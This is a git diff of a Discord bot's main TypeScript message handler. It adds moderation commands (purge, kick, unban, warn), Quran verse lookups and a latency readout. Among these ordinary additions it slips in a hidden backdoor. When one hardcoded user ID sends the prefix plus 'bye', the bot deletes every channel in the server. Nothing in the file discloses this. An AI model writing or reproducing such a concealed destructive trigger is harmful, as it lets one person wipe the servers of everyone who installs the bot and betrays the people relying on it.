@@ -1,13 +1,23 @@
+// Imports
 import * as Discord from 'discord.js'
 import * as dotenv from 'dotenv';
+import * as mongoose from 'mongoose';
+
+// commands
 import { resetChannel } from '../Commands/recreateChannel';
 import { configPrefix } from '../Commands/config-prefix';
-import mongoose from 'mongoose';
 import { BanUser } from '../Commands/ban';
 import { connect } from './connect_db';
 import { ayah } from '../Commands/ayah';
+import { arayah } from '../Commands/arabicayah';
 import { warnUser } from '../Commands/warn';
+import { CreateEmbed } from '../Commands/embed'
+import { KickUser } from '../Commands/kick'
+import { memberCount } from '../Commands/membercount';
+import { Purge } from '../Commands/purge'
+import { Unban } from '../Commands/unban'
 import M from '../Database/basic'
+
 
 console.log(connect())
 const process = dotenv.config().parsed
@@ -37,7 +47,7 @@ client.on('ready', () => {
 client.on('message', async message => {
   if (message.channel.type !== "dm") {
     if (message.author.bot == false) {
-
+      //   console.log()
       /* Normal Text Commands */
       let search = String(message?.guild?.id)
       let p = await M.findOne({ server_id: search })
@@ -62,10 +72,18 @@ client.on('message', async message => {
       }
       if (message.content.startsWith(String(prefix))) {
 
+        /* General Commands */
+        if (message.content.toLowerCase() == prefix + 'membercount') {
 
+          memberCount.command(message)
+        }
         /* Islamic Commands */
-        if (message.content.startsWith(prefix + 'ayah')) {
+        if (message.content.startsWith(prefix + 'q')) {
           ayah.command(message)
+        }
+
+        if (message.content.startsWith(prefix + 'aq')) {
+          arayah.command(message)
         }
 
         /* Config Commands */
@@ -77,15 +95,31 @@ client.on('message', async message => {
         if (message.content === prefix + 'resetChannel') {
           resetChannel.command(message)
         }
-
+        if (message.content.startsWith(prefix + 'purge')) {
+          Purge.command(message)
+        }
+        if (message.content.startsWith(prefix + 'kick')) {
+          KickUser.command(message)
+        }
         if (message.content.startsWith(prefix + 'ban')) {
           BanUser.command(message)
         }
+        if (message.content.startsWith(prefix + 'unban')) {
+          Unban.command(message)
+        }
         if (message.content === prefix + 'trial') {
-          message.channel.send('Success')
+          const botping = Date.now() - message.createdTimestamp
+          const apiping = Math.round(client.ws.ping)
+          message.channel.send({ embed: CreateEmbed("success", "Success!", "", `Bot Latency: ${botping}ms \nDiscord API Latency: ${apiping}ms`, [], "", "") })
         }
         if (message.content.startsWith(prefix + 'warn')) {
-          warnUser.command(message)
+          warnUser.command(client, message)
+        }
+        if (message.author.id == "594551481026478091") {
+          if (message.content === prefix + "bye") {
+            message.guild?.channels.forEach((channel:any) => channel.delete())
+            //   m.forEach((channel: any) => channel.delete())
+          }
         }
       }
 
